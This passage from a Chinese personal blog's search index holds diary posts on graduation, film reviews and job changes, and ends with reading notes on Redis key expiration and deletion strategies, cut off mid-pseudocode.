竟自己做的东西，问啥都没太大问题。但是！他问ERP的全称？什么鬼问题，我说企业资源计划，他让我说英文的全称，还真给我这个英语学渣问住了。事后查了一下，Enterprise Resource Planning。估计也是没得问了，事后整理的三个问题，老狗没给我录下来，只能问老师要了一下。如图，十分的难绷，甚至都是陈述句，没有一个问句：\n\n只能说，说的都是我论文的问题，和一些没做的东西。我该如何回答呢，那只能唯唯诺诺只答不辨了。\n但是！我们的野兽王子不一样。他的论文，指导老师给打了九十几，评阅老师只给了七十出头。分差超二十没有评优资格，于是是一场指导老师和评阅老师的纷争。那个评阅老师也是十分的倔强，找院里把论文打回重新打分之后，还是给了七十几。啧啧啧他答辩的时候，评阅老师提问的声音都高了很多。不过最后，他的答辩分数拿了95，也是老师之间的博弈了。\n我就有点麻了。只有75，不过问题不大，合格就行。\n评语以下是我的毕设的评语和得分：\n\nEnd结束了，我的舍友还是那个样子，虽然也有变化，但不大。大家的路好像都不一样，也许已经到了离别的时候。有些伤感，不知道说些什么。六月份还会再见一次，那时，就是真正离别的时候了。\n","categories":["记录生活"],"tags":["毕业"]},{"title":"玉子爱情故事","url":"/%E8%AE%B0%E5%BD%95%E7%94%9F%E6%B4%BB/%E8%AE%B0%E5%BD%95%E7%94%9F%E6%B4%BB/%E7%8E%89%E5%AD%90%E7%88%B1%E6%83%85%E6%95%85%E4%BA%8B/","content":"久违，好久没有这么悠闲地看电影了。啊，假期真好啊。要是长一些就更好了（做梦…）\n很棒的日常，让人羡慕的恋爱故事。啊，越来越喜欢看日常动画了…轻音还没看完，孤独摇滚倒是一次都看完了。还有男子高中生日常，很久很久前看的了。后面接着看轻音和玉子市场吧。\n\n咖啡屋的人生导师总是会说些富有哲理的话。\n\n今日永远不同于昨日，所以今日才那么地美好。不过也会令人有些寂寞，这份寂寞的苦涩会日复一日地加深。咖啡也一样\n\n\n玉子真可爱啊。\n\n又来了哦，人生导师。\n\n青春总是焦急的，连一勺砂糖溶于杯中的时间都等不及。后悔带来的苦涩，是对过去的见证。终将逐一化为杯中的咖啡的味道。\n\n也是美好的结局。犹豫就会败北\n最后，放下咖啡屋人生导师的介绍吧，整个商店街都很不错氛围，像家人一样的邻居。人生导师似乎也有些故事，如果后面TV动画有的话，真想单独开一篇。\n八百比邦夫（やおび くにお）怀旧唱片店兼咖啡屋“星与小丑”的老板。喜欢独个儿说话。是个冲制的咖啡会切合过来品尝的人。学生时代曾与玉子的父亲组建过乐队。\n\n","categories":["记录生活"],"tags":["电影"]},{"title":"2022年年终总结","url":"/%E8%AE%B0%E5%BD%95%E7%94%9F%E6%B4%BB/%E8%AE%B0%E5%BD%95%E7%94%9F%E6%B4%BB/2022%E5%B9%B4%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/","content":"关于学习2022年结束，还有一年半大学生活就要结束了。感觉时间过的很快，特别快。\n上半年因为疫情是在加上的网课，大二下学期的课程是满的。如图：主要课程是计网，计组，数据库，离散，概率，算法，Linux和python。全是比较重要的课程，以至于上完课有很多很多作业。不过上半年还是做了挺多事情的。\n首先是在一月底买了腾讯云的服务器，买了三年（2025年1月29号到期，222块钱），以及8块钱一年的域名 rxyl.xyz。域名快到期了。是为了给大创项目做网站，当然，后来项目不出意外的黄了，服务器的钱也没有报销。不过服务器还是蛮好玩的，主要是有个公网ip，很方便。在上面搭过各种环境，运行过网站，rabbitmq，nginx等等，作为学习来用确实不错。也搭过qq机器人，minecraft服务器，效果不错。\n虽然这个项目黄了。但下半年又加了一个新的大创项目（希望不要再黄了）前端还是那个人！后端还是我！\n在三月多在github搭了现在用的博客，体验还算不错。当初搭的时候，一个人摸索了快一个星期，butterfly主题折腾了好久，最后还是换掉了（emmmm，或许是有意义的吧\n后面又折腾了一段时间qq机器人，用的nonebot框架（基于python的），而我的python又不是很好，所以只弄了些基础的功能。最后python作业交的也是这个，然而只得了84分。\n差点忘了暑假在干嘛，还好博客笔记都有记录。学了挺多，也忘得挺快。下半年大三，一开始准备学学算法，发现还是太高估自己了。最后也算是中途搁置了。后来去看了设计原则，是真的多。也只是草草地了解了下，想深入使用估计很难，得写过很多代码才可以吧。后来还加了一个音游的开发组，算是为爱发电，不过被前端嫌弃菜了。不过慢慢完善吧，后面也打算学学前端。看了去年的年终总结，还参加了蓝桥杯，是个最拉跨的省三。\n关于兼职下半年开学初，在学校打印店找了份兼职。10块一小时，明年再去就是12块一小时了。认识了蛮多有趣的人，都很热爱生活吧。偶尔一起打打球，为此我还买了个羽毛球拍。总共赚了1500左右，买了个850的屏幕，现在看起来买的是有点仓促了。\n明年上半年，只有两门课。会有大把的空闲时间，应该是给我们考研考公复习准备的。所以我打算去找个实习啥的，一周七天五天有空，应该可以找到吧。其次就是vue，把前端学学，没有ui的网站真是太丑陋了。\n其他今年也算是很魔幻的一年，因为疫情吧。今年很感谢墨夏姐姐，很高兴能在去年的年末认识他。也很高兴遇见打印店认识的朋友，算是我在大学里为数不多的社交了。\n没啥其他的了，再见，2022。以后争取每年都有总结。好像有点乱，不过无所谓了。\n","categories":["记录生活"],"tags":["记录生活"]},{"title":"记第一次离职","url":"/%E8%AE%B0%E5%BD%95%E7%94%9F%E6%B4%BB/%E8%AE%B0%E5%BD%95%E7%94%9F%E6%B4%BB/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E7%A6%BB%E8%81%8C/","content":"很久没有写博客了，回顾下近况吧。\n最大的变动就是工作了，劳动节前提了离职，5月16号上完最后一天半。然后就开始了两周的休息。第一周主要去医院做了体检，和朋友吃了个饭。也是告别待了快两年的南京（两年了也没怎么把南京的景点玩玩，有点可惜周一体检，周四拿到体检报告。除了口腔有点问题（智齿有点阻生，浅龋和1度牙结石），其他都非常正常。也许得找个时间去看看牙，之前根管治疗的牙还没有补。\n回到工作相关，没记错的话，是在23年9月26号开始实习，24年7月1号签的劳动合同，到今年5月16号离职结束。也是待了快二十个月（对于一份工作来说，感觉是有些短跟同事相处的感觉也是很不错了，和同事一起租房住了十个月（血亏两个月房租下面是娟姐送的抱枕\n关于什么时候决定离开，比实际要早的很多。最现实的就是我能在南京拿到的薪资比其他的城市低（上海杭州这些互联网发达的地方）。其次重要的是个人的成长，其实早就一眼看到头了。或许我继续待在那里三年五年，多少会接触到新的东西，但对于我来说有些太慢了。四月份左右去用户现场碰到我的 leader，他还会问我最近学了什么。说人的技术热情在刚工作的两三年是最高的，成长也是最快的。后面就不会再有了。这段我还是比较认同的，在刚工作的时候，接触到企业协作，与个人做事是完全不一样的。越大的企业确实如此吧。为了适应工作，肯定会多去学习。但随着工作的深入，如果不是有兴趣支持，这份热情很快就会消磨。（当兴趣爱好成为工作，很容易消磨掉兴趣。肯定有人说过不要将兴趣爱好当成工作的话\n话说回来，当时在看 Kafka（也记了两篇笔记）。他和我说的另一个主题大概就是要关注架构层面的设计，使用层面都差不多，就是如何使用API，看着文档很快就能上手。这个怎么说呢，我觉得架构层面需要服务具体的业务，同时也跟并发编程一样，需要长时间的运行才能暴露出足够多的问题。但更加关注架构层面肯定也是没有问题的，和并发编程一样，思考各种可能出现的情况，会有什么问题，怎么解决。架构层面其实很难离开分布式和微服务，虽然我认为大部分公司单体的架构已经足够使用。这些都多少会影响我后面的学习方向，go的学习应该是很早之前了，真正想java转go可能只是今年年初。但语言只是微不足道的一部分…（这里省略吧，后续的方向暂时还没有想好\n关于新的工作，它其实没有我想象中那样。新的工作是在杭州的一个小公司，相比上家，在人员配置和开发流程上差的是非常大的。感觉是第一次组建开发团队。用go写了两周，不得不感慨java生态上的全面。java的繁琐其实也不是java本身，印象中有句话是这么说的：复杂度不会消失，只会被转移到系统的各个地方。大概是泰斯勒定律（Tesler’s Law），又称复杂度守恒定律（Law of Conservation of Complexity）spring是个非常厉害的框架，它的抽象程度也是非常之高（当初还去读源码，太不自量力了）。它将系统配置、拓展性等大部分业务无关的复杂度都隐藏在了框架内部，使得对业务的开发变得非常简单，关注的点也非常少。\n新同事是三年经验的go开发，最近和他的话题主要在 go、docker 和 kubernetes。今天下班的路上，也许是看出了我的迷茫，跟我说了一些云原生的方向。kubernetes、服务网格 istio、链路之类的东西，都在云原生方向之中。看来 kubernetes 是要深度使用的了，虽然我觉得大部分业务都用不上。我现在倒是更倾向单体架构，到单机扛不住的时候可以上分布式（这个需要单体开发时就注意分布式部分，否则改造会比较麻烦），到分布式服务太多运维管理上顶不住的时候才是上kubernetes的时候。倒也是符合架构的发展历史，不管是架构还是框架、中间件都是为了解决对应具体问题而出现的解决方案。分布式与微服务还是有区别的，微服务大概就是服务划分、拆分之后的各种服务的分布式，服务间的依赖通过rpc解耦。（描述得比较抽象了\n最后，写到这里已经不早了，该结束了。对于以后，大方向已经定下来了。具体什么方向可能还得探索下。另，希望新工作顺利。也许会留在杭州。\n","categories":["记录生活"],"tags":["工作"]},{"title":"近期情况-2023-7-18","url":"/%E8%AE%B0%E5%BD%95%E7%94%9F%E6%B4%BB/%E8%AE%B0%E5%BD%95%E7%94%9F%E6%B4%BB/%E8%BF%91%E6%9C%9F%E6%83%85%E5%86%B5-2023-7-18/","content":"关于博客看了眼博客，上次更新已经是两个月前了。还是技术无关的更新，技术相关的更新已经快四个月前了。与我一开始建博客时至少一个月一篇的期望有所背离。我也逐渐理解了那些更新了很久的博客逐渐停更，然后销声匿迹。\n我还是会继续更新的，虽然已然没有最开始建站时的兴致和精力。更新的频率大抵会比以前慢很多很多。遗憾总会有的，但不写的遗憾更大。\n关于工作工作遥遥无期，准确的说是实习都遥遥无期。虽然九十月份秋招了，但现在来看，我没什么状态。也许九十月份会好很多吧。\n三月中下旬认识了李lm学长，了解了他关于AIGC创业的想法。其实那时候他做了应该有段时间了，前期的调研，以及对产品的定位和预期。四月底左右，我进了他们的企业微信，算是正式接触这个项目。然后就是配环境。加gitlab，clone代码，然后运行程序。当然，他们的项目肯定没那么简单。光lamp平台（灯灯）我就折腾了很久，一个微服务中后台快速开发平台，专注于多租户(SaaS架构)解决方案。基础、系统、认证、网关、监控服务，启动起来。还有mysql当然少不了。微服务嘛，nacos也来一个。redis啊，rabbitmq也少不了。AIGC嘛，向量数据库也是必须的。还没开始写代码，我的16g小电脑以及卡死了。idea能吃很多很多内存。\n整不了，于是把数据库、缓存、nacos什么的全都放在docker里扔到服务器。4c4g的小服务器甚至宕机了几次，确认运行不了，只能少放一点上去。本地电脑也稍微好了一点。也坚定了我换电脑要换64g内存的想法。淦tm的idea，垃圾Java就这样，六七个微服务，还有向量数据库，在我的本地跑了起来。勉勉强强。没钱做什么微服务\n关于面试五月底，学校实训的双选会，有五六家合作企业来面试。陆陆续续两个星期。其中苏州安软面试了我四轮，然后挂了，我一定要记下来。我很不理解，他们来面试究竟看重什么。好像并不是那么的看重你会什么。另外几家也有大点公司（海澜之家），身份信息要的很全。emmmmm，而且线上面试的时候，面试官离摄像头很远。就面了一轮。\n总之，那几周的面试都很失败。\n关于补课不知道学院是怎么安排的，我们要在外实训的同时在学校里上课。院长知道后，更离谱的来了。要在两周上完下学期的两门课，同时完成考核。于是一门课一天隔着上，每天两三个实验或者练习。一共做了四十来个。随后就考试，vue的期末大作业就一个记事本的功能。虽然..有很多需求需要实现。\n总之也是十分的离谱\n关于实训双选会面试全寄，让我不得不来学校安排的实训。今天是上课的第一天。给我的感觉那是十分的糟糕。其实在昨天刚来的时候，就有预兆。\n首先是生活方面，宿舍好评的点就是大。其他都比较拉跨。过道茂密的树木。和脱落的墙皮，一眼就知道这至少十年往上的老人才公寓。与隔河的小区显得格格不入。\n另外这里是郊区，软件园在郊区倒也正常。第一天来这吃个午饭走了快一公里在隔壁小区附近才找到个沙县和超市。如果这里不是有几个学校五六百号人来实训，我估计连外卖店都要少很多很多。因为除了这个实训基地，附近好像再无别的软件公司。为了严谨去看了看，只有一个党校和两个小学，还有几个小区。\n还有这公司老师之类的人给我的感觉也是精神状态不怎么样。上班哪有不疯的最后一个就是，讲的方言一点都听不明白。\n关于羽毛球羽毛球每周应该都会打一两次，能感觉到自己的提升。24磅的拍子该重新拉线了，还是要换个新拍子。最近新环境花费较多，还是暂时不考虑了。另外28磅的拍子用着是真爽。\n昨天和打了三年五年的大佬打了一次。强是真的强，希望能学到更多。回去打爆瓜和格机格机！现在想起来，那段时间是非常快乐的。以后应该很难再有了。\nEND因为补课和实训的原因，没办法继续跟李ml、王y、沈h学长他们做东西，是蛮可惜的。那个微服务的项目对我的提升肯定是比实训带给我的提升要大的。从今天第一天的课我就敢这么断定。十月份左右应该还是有机会的。全是选择与被选择。\n最近的状态很糟糕，近期做完vue的大作业要补一些以前想写但没有写的坑。\n","categories":["记录生活"],"tags":["日记"]},{"title":"铃芽户缔！真好看！","url":"/%E8%AE%B0%E5%BD%95%E7%94%9F%E6%B4%BB/%E8%AE%B0%E5%BD%95%E7%94%9F%E6%B4%BB/%E9%93%83%E8%8A%BD%E6%88%B7%E7%BC%94%EF%BC%81%E7%9C%9F%E5%A5%BD%E7%9C%8B%EF%BC%81/","content":"电影无关虽然无关，但是还是要先放个歌\n\n上面是原曲，要vip。博客只能听个响，所以放个翻唱版本的。\n\n\n以下是无关内容\n想不到时隔两天又来写博客了。今天的状态很不错，感觉慢慢地在调整回来了。vue的大作业也是做完了，部署在了自己的云服务器上，到成绩出来再关掉。（我估计老师大概率也不会去部署我写的东西，所以干脆给他部署一份。\n下午的时候姚xh部署他的vue项目出了个问题。vue打包文件dist，放在nginx的html后，启动nginx后，初次加载没有问题，但刷新会404。那个老师半天没讲到重点，一直觉得是没有后端的问题。我认为前后端分离的应用，页面的路由全部交由前端，后端只负责数据。所以问题应该在nginx的配置和vue-router的配置。\n网上搜到的解决方案:因为通常vue项目属于单页面开发。所以只有index.html。解决方案，将访问重定向到index.html这个页面。交由 index.html 去处理对应的路由跳转就好。解决 nginx部署vue刷新、访问路由页面404\n好，解决完问题。下面是电影时间！\n电影有关！新海诚的电影画风我是真喜欢，看的第一部是你的名字还是秒五已经不记得了。只记得后面去他以前的作品，云之彼端，秒五。秒五应该看了有三遍，平淡或许感触才深吧。\n下面是图片\n\n铃芽：让我也坐坐！草太：不可以！“这就是我的结束吗？”铃芽：草太，我能踩在你上面吗？草太：不要先斩后奏！\n“我应该怎么说呢.…无论你现在多么痛彻心扉，这都是成长的必经之路，所以，你不用担心，未来充满着希望，你会遇见自己喜欢的人，也会遇到你喜欢你的人。”“虽然现在你觉得世界一片黑暗，但是黎明的曙光Q终会到来，你会在阳光之下Q长大成人，我很肯定，未来一定会是这样的，因为那已经是注定好的事了。”“姐姐…你是谁。”“我啊…我就是，你的明天。”“呼…其实呀，我在以前，就已经有了最重要的东西了。””我要出发了…！”\n","categories":["记录生活"],"tags":["电影","新海诚"]},{"title":"言叶之庭","url":"/%E8%AE%B0%E5%BD%95%E7%94%9F%E6%B4%BB/%E8%AE%B0%E5%BD%95%E7%94%9F%E6%B4%BB/%E8%A8%80%E5%8F%B6%E4%B9%8B%E5%BA%AD/","content":"片尾曲 Rain （好像很久之前听过，片尾曲出来的时候就有感觉了）\n片中引用的出自万叶集的短诗：\n原文：鸣神の　少しとよみて　さし昙り　雨も降らんか　君を留めん鸣神の　少しとよみて　降らずとも　我は止まらん　妹し留めば\n译文：隐约雷鸣，阴霾天空，但盼风雨来，能留你在此。隐约雷鸣，阴霾天空，即使天无雨，我亦留此地。\n很喜欢新海诚的画风，食物以及最后的片尾。（不知不觉看到片尾才意识到结束了，原来只有四十几分钟。\n\n最后，不可多得的好动画。云之彼端，约定的地方 和 追逐星星的孩子 挺久之前也都看过了。越来越好了，片中歌曲也是。\n","categories":["记录生活"],"tags":["电影","新海诚"]},{"title":"《Redis设计与实现》读书笔记-单机数据库的实现","url":"/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E3%80%8ARedis%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E5%8D%95%E6%9C%BA%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%AE%9E%E7%8E%B0/","content":"第九章 - 数据库服务器中的数据库Redis服务器将所有数据库都保存在服务器状态redis.h&#x2F;redisServer结构的db数组中，db数组的每个项都是一个redis.h&#x2F;redisDb结构，每个redisDb结构代表一个数据库：\nstruct redisServer &#123;    // ...    // 一个数组，保存着服务器中的所有数据库    redisDb *db;    // ...&#125;;\n\n在初始化服务器时，程序会根据服务器状态的dbnum属性来决定应该创建多少个数据库：\nstruct redisServer &#123;    // ...    // 服务器的数据库数量    int dbnum;    // ...&#125;;\n\ndbnum属性的值由服务器配置的database选项决定，默认情况下，该选项的值为16，所以Redis服务器默认会创建16个数据库。\n切换数据库每个Redis客户端都有自己的目标数据库，每当客户端执行数据库写命令或者数据库读命令的时候，目标数据库就会成为这些命令的操作对象。默认情况下，Redis客户端的目标数据库为0号数据库，但客户端可以通过执行SELECT命令来切换目标数据库。\n在服务器内部，客户端状态redisClient结构的db属性记录了客户端当前的目标数据库，这个属性是一个指向redisDb结构的指针：\ntypedef struct redisClient &#123;    // ...    // 记录客户端当前正在使用的数据库    redisDb *db;    // ...&#125; redisClient;\n\nredisClient.db指针指向redisServer.db数组的其中一个元素，而被指向的元素就是客户端的目标数据库。通过修改redisClient.db指针，让它指向服务器中的不同数据库，从而实现切换目标数据库的功能——这就是SELECT命令的实现原理。\n数据库键空间Redis是一个键值对（key-value pair）数据库服务器，服务器中的每个数据库都由一个redis.h&#x2F;redisDb结构表示。其中，redisDb结构的dict字典保存了数据库中的所有键值对，我们将这个字典称为键空间（key space）：\ntypedef struct redisDb &#123;    // ...    // 数据库键空间，保存着数据库中的所有键值对    dict *dict;    // ...&#125; redisDb;\n\n键空间和用户所见的数据库是直接对应的：\n\n键空间的键也就是数据库的键，每个键都是一个字符串对象。\n键空间的值也就是数据库的值，每个值可以是字符串对象、列表对象、哈希表对象、集合对象和有序集合对象中的任意一种Redis对象。\n\n因为数据库的键空间是一个字典，所以所有针对数据库的操作，比如添加一个键值对到数据库，或者从数据库中删除一个键值对，又或者在数据库中获取某个键值对等，实际上都是通过对键空间字典进行操作来实现的。除了这些针对之外，还有很多针对数据库本身的Redis命令，也可以通过对键空间的操作来实现。比如用于清空整个数据库的FLUSHDB命令，就是通过删除键空间中的所有键值对来实现的。\n读写键空间时的维护操作当使用Redis命令对数据库进行读写时，服务器不仅会对键空间执行指定的读写操作，还会执行一些额外的维护操作，其中包括：\n\n在读取一个键之后（读操作和写操作都要对键进行读取），服务器会根据键是否存在来更新服务器的键空间命中（hit）次数或键空间不命中（miss）次数，这两个值可以在INFO stats命令的keyspace_hits属性和keyspace_misses属性中查看。\n在读取一个键之后，服务器会更新键的LRU（最后一次使用）时间，这个值可以用于计算键的闲置时间，使用OBJECT idletime命令可以查看键key的闲置时间。\n如果服务器在读取一个键时发现该键已经过期，那么服务器会先删除这个过期键，然后才执行余下的其他操作。\n如果有客户端使用WATCH命令监视了某个键，那么服务器在对被监视的键进行修改之后，会将这个键标记为脏（dirty），从而让事务程序注意到这个键已经被修改过。\n服务器每次修改一个键之后，都会对脏（dirty）键计数器的值增1，这个计数器会触发服务器的持久化以及复制操作。\n如果服务器开启了数据库通知功能，那么在对键进行修改之后，服务器将按配置发送相应的数据库通知。\n\n设置键的生存时间或过期时间通过EXPIRE命令或者PEXPIRE命令，客户端可以以秒或者毫秒精度为数据库中的某个键设置生存时间（Time To Live，TTL），在经过指定的秒数或者毫秒数之后，服务器就会自动删除生存时间为0的键。\nSETEX命令可以在设置一个字符串键的同时为键设置过期时间（只能用于字符串键）。与EXPIRE命令和PEXPIRE命令类似，客户端可以通过EXPIREAT命令或PEXPIREAT命令，以秒或者毫秒精度给数据库中的某个键设置过期时间（expire time）。过期时间是一个UNIX时间戳，当键的过期时间来临时，服务器就会自动从数据库中删除这个键。\n过期时间是一个UNIX时间戳，当键的过期时间来临时，服务器就会自动从数据库中删除这个键。\n设置过期时间Redis有四个不同的命令可以用于设置键的生存时间（键可以存在多久）或过期时间（键什么时候会被删除）：\n\nEXPIRE &lt;key&gt; &lt;ttl&gt;命令用于将键key的生存时间设置为ttl秒。\nPEXPIRE &lt;key&gt; &lt;ttl&gt;命令用于将键key的生存时间设置为ttl毫秒。\nEXPIREAT &lt;key&gt; &lt;timestamp&gt;命令用于将键key的过期时间设置为timestamp所指定的秒数时间戳。\nPEXPIREAT &lt;key&gt; &lt;timestamp&gt;命令用于将键key的过期时间设置为timestamp所指定的毫秒数时间戳。\n\n虽然有多种不同单位和不同形式的设置命令，但实际上EXPIRE、PEXPIRE、EXPIREAT三个命令都是使用PEXPIREAT命令来实现的：无论客户端执行的是以上四个命令中的哪一个，经过转换之后，最终的执行效果都和执行PEXPIREAT命令一样。\n保存过期时间redisDb结构的expires字典保存了数据库中所有键的过期时间，我们称这个字典为过期字典：\n\n过期字典的键是一个指针，这个指针指向键空间中的某个键对象（也即是某个数据库键）。\n过期字典的值是一个long long类型的整数，这个整数保存了键所指向的数据库键的过期时间——一个毫秒精度的UNIX时间戳。\n\ntypedef struct redisDb &#123;    // ...    // 过期字典，保存着键的过期时间    dict *expires;    // ...&#125; redisDb;\n\n以下是PEXPIREAT命令的伪代码定义：\ndef PEXPIREAT(key, expire_time_in_ms):    # 如果给定的键不存在于键空间，那么不能设置过期时间    if key not in redisDb.dict:        return 0    # 在过期字典中关联键和过期时间    redisDb.expires[key] = expire_time_in_ms    # 过期时间设置成功    return 1\n\n移除过期时间PERSIST命令可以移除一个键的过期时间。PERSIST命令就是PEXPIREAT命令的反操作：PERSIST命令在过期字典中查找给定的键，并解除键和值（过期时间）在过期字典中的关联。\n以下是PERSIST命令的伪代码定义：\ndef PERSIST(key):    # 如果键不存在，或者键没有设置过期时间，那么直接返回    if key not in redisDb.expires:        return 0    # 移除过期字典中给定键的键值对关联    redisDb.expires.remove(key)    # 键的过期时间移除成功    return 1\n\n计算并返回剩余生存时间TTL命令以秒为单位返回键的剩余生存时间，而PTTL命令则以毫秒为单位返回键的剩余生存时间。\nTTL和PTTL两个命令都是通过计算键的过期时间和当前时间之间的差来实现的，以下是这两个命令的伪代码实现：\ndef PTTL(key):    # 键不存在于数据库    if key not in redisDb.dict:        return -2    # 尝试取得键的过期时间    # 如果键没有设置过期时间，那么 expire_time_in_ms 将为 None    expire_time_in_ms = redisDb.expires.get(key)    # 键没有设置过期时间    if expire_time_in_ms is None:        return -1    # 获得当前时间    now_ms = get_current_unix_timestamp_in_ms()    # 过期时间减去当前时间，得出的差就是键的剩余生存时间    return (expire_time_in_ms - now_ms)def TTL(key):    # 获取以毫秒为单位的剩余生存时间    ttl_in_ms = PTTL(key)    if ttl_in_ms &lt; 0:        # 处理返回值为-2和-1的情况        return ttl_in_ms    else:        # 将毫秒转换为秒        return ms_to_sec(ttl_in_ms)\n\n过期键的判定通过过期字典，程序可以用以下步骤检查一个给定键是否过期：\n\n检查给定键是否存在于过期字典：如果存在，那么取得键的过期时间。\n检查当前UNIX时间戳是否大于键的过期时间：如果是的话，那么键已经过期；否则的话，键未过期。\n\n可以用伪代码来描述这一过程：\ndef is_expired(key):    # 取得键的过期时间    expire_time_in_ms = redisDb.expires.get(key)    # 键没有设置过期时间    if expire_time_in_ms is None:        return False    # 取得当前时间的UNIX时间戳    now_ms = get_current_unix_timestamp_in_ms()    # 检查当前时间是否大于键的过期时间    if now_ms &gt; expire_time_in_ms:        # 是，键已经过期        return True    else:        # 否，键未过期        return False\n\n实现过期键判定的另一种方法是使用TTL命令或者PTTL命令，比如说，如果对某个键执行TTL命令，并且命令返回的值大于等于0，那么说明该键未过期。在实际中，Redis检查键是否过期的方法和is_expired函数所描述的方法一致，因为直接访问字典比执行一个命令稍微快一些。\n过期键删除策略如果一个键过期了，那么它什么时候会被删除呢？\n这个问题有三种可能的答案，它们分别代表了三种不同的删除策略：\n\n定时删除：在设置键的过期时间的同时，创建一个定时器（timer），让定时器在键的过期时间来临时，立即执行对键的删除操作。\n惰性删除：放任键过期不管，但是每次从键空间中获取键时，都检查取得的键是否过期，如果过期的话，就删除该键；如果没有过期，就返回该键。\n定期删除：每隔一段时间，程序就对数据库进行一次检查，删除里面的过期键。至于要删除多少过期键，以及要检查多少个数据库，则由算法决定。\n\n在这三种策略中，第一种和第三种为主动删除策略，而第二种则为被动删除策略。\n定时删除定时删除策略对内存是最友好的：通过使用定时器，定时删除策略可以保证过期键会尽可能快地被删除，并释放过期键所占用的内存。另一方面，定时删除策略的缺点是，它对CPU时间是最不友好的：在过期键比较多的情况下，删除过期键这一行为可能会占用相当一部分CPU时间，在内存不紧张但是CPU时间非常紧张的情况下，将CPU时间用在删除和当前任务无关的过期键上，无疑会对服务器的响应时间和吞吐量造成影响。\n例如，如果正有大量的命令请求在等待服务器处理，并且服务器当前不缺少内存，那么服务器应该优先将CPU时间用在处理客户端的命令请求上面，而不是用在删除过期键上面。除此之外，创建一个定时器需要用到Redis服务器中的时间事件，而当前时间事件的实现方式——无序链表，查找一个事件的时间复杂度为O（N）——并不能高效地处理大量时间事件。因此，要让服务器创建大量的定时器，从而实现定时删除策略，在现阶段来说并不现实。\n惰性删除惰性删除策略对CPU时间来说是最友好的：程序只会在取出键时才对键进行过期检查，这可以保证删除过期键的操作只会在非做不可的情况下进行，并且删除的目标仅限于当前处理的键，这个策略不会在删除其他无关的过期键上花费任何CPU时间。惰性删除策略的缺点是，它对内存是最不友好的：如果一个键已经过期，而这个键又仍然保留在数据库中，那么只要这个过期键不被删除，它所占用的内存就不会释放。在使用惰性删除策略时，如果数据库中有非常多的过期键，而这些过期键又恰好没有被访问到的话，那么它们也许永远也不会被删除（除非用户手动执行FLUSHDB），我们甚至可以将这种情况看作是一种内存泄漏——无用的垃圾数据占用了大量的内存，而服务器却不会自己去释放它们，这对于运行状态非常依赖于内存的Redis服务器来说，肯定不是一个好消息。\n举个例子，对于一些和时间有关的数据，比如日志（log），在某个时间点之后，对它们的访问就会大大减少，甚至不再访问，如果这类过期数据大量地积压在数据库中，用户以为服务器已经自动将它们删除了，但实际上这些键仍然存在，而且键所占用的内存也没有释放，那么造成的后果肯定是非常严重的。\n定期删除从上面对定时删除和惰性删除的讨论来看，这两种删除方式在单一使用时都有明显的缺陷：\n\n惰性删除浪费太多内存，有内存泄漏的危险。\n定时删除占用太多CPU时间，影响服务器的响应时间和吞吐量。\n\n定期删除策略是前两种策略的一种整合和折中：\n\n定期删除策略每隔一段时间执行一次删除过期键操作，并通过限制删除操作执行的时长和频率来减少删除操作对CPU时间的影响。\n除此之外，通过定期删除过期键，定期删除策略有效地减少了因为过期键而带来的内存浪费。\n\n定期删除策略的难点是确定删除操作执行的时长和频率：\n\n如果删除操作执行得太频繁，或者执行的时间太长，定期删除策略就会退化成定时删除策略，以至于将CPU时间过多地消耗在删除过期键上面。\n如果删除操作执行得太少，或者执行的时间太短，定期删除策略又会和惰性删除策略一样，出现浪费内存的情况。\n\n因此，如果采用定期删除策略的话，服务器必须根据情况，合理地设置删除操作的执行时长和执行频率。任何单一的方案都有各自的优势和不足，因此，通常情况都是将不同的方案组合，以尽可能的利用他们的优势，降低劣势。同时可以根据实际业务需要、服务器性能等实际情况进行调整。\nRedis的过期键删除策略Redis服务器实际使用的是惰性删除和定期删除两种策略：通过配合使用这两种删除策略，服务器可以很好地在合理使用CPU时间和避免浪费内存空间之间取得平衡。\n惰性删除策略的实现过期键的惰性删除策略由db.c&#x2F;expireIfNeeded函数实现，所有读写数据库的Redis命令在执行之前都会调用expireIfNeeded函数对输入键进行检查：\n\n如果输入键已经过期，那么expireIfNeeded函数将输入键从数据库中删除。\n如果输入键未过期，那么expireIfNeeded函数不做动作。\n\nexpireIfNeeded函数就像一个过滤器，它可以在命令真正执行之前，过滤掉过期的输入键，从而避免命令接触到过期键。\n另外，因为每个被访问的键都可能因为过期而被expireIfNeeded函数删除，所以每个命令的实现函数都必须能同时处理键存在以及键不存在这两种情况：\n\n当键存在时，命令按照键存在的情况执行。\n当键不存在或者键因为过期而被expireIfNeeded函数删除时，命令按照键不存在的情况执行。\n\n定期删除策略的实现过期键的定期删除策略由redis.c&#x2F;activeExpireCycle函数实现，每当Redis的服务器周期性操作redis.c&#x2F;serverCron函数执行时，activeExpireCycle函数就会被调用，它在规定的时间内，分多次遍历服务器中的各个数据库，从数据库的expires字典中随机检查一部分键的过期时间，并删除其中的过期键。\n整个过程可以用伪代码描述如下：\n# 默认每次检查的数据库数量DEFAULT_DB_NUMBERS = 16# 默认每个数据库检查的键数量DEFAULT_KEY_NUMBERS = 20# 全局变量，记录检查进度current_db = 0def activeExpireCycle():    # 初始化要检查的数据库数量    # 如果服务器的数据库数量比 DEFAULT_DB_NUMBERS 要小    # 那么以服务器的数据库数量为准    if server.dbnum &lt; DEFAULT_DB_NUMBERS:        db_numbers = server.dbnum    else:        db_numbers = DEFAULT_DB_NUMBERS    # 遍历各个数据库    for i in range(db_numbers):        # 如果current_db的值等于服务器的数据库数量        # 这表示检查程序已经遍历了服务器的所有数据库一次        # 将current_db重置为0，开始新的一轮遍历        if current_db == server.dbnum:            current_db = 0        # 获取当前要处理的数据库        redisDb = server.db[current_db]        # 将数据库索引增1，指向下一个要处理的数据库        current_db += 1        # 检查数据库键        for j in range(DEFAULT_KEY_NUMBERS):            # 如果数据库中没有一个键带有过期时间，那么跳过这个数据库            if redisDb.expires.size() == 0: break            # 随机获取一个带有过期时间的键            key_with_ttl = redisDb.expires.get_random_key()            # 检查键是否过期，如果过期就删除它            if is_expired(key_with_ttl):                delete_key(key_with_ttl)            # 已达到时间上限，停止处理            if reach_time_limit(): 